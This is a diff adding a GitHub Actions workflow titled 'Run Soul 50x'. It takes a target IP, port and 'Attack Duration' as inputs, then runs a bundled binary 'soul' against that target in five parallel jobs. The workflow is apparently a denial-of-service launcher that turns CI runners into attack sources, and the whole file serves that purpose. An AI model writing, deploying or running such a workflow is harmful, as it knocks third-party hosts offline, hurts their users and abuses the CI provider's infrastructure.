@@ -1,0 +1,30 @@
+name: Run Soul 50x
+
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: "Target IP"
+        required: true
+      port:
+        description: "Target Port"
+        required: true
+      time:
+        description: "Attack Duration"
+        required: true
+
+jobs:
+  soul:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        n: [1,2,3,4,5]
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Make soul binary executable
+        run: chmod +x soul
+
+      - name: Run soul binary
+        run: ./soul ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }}
+
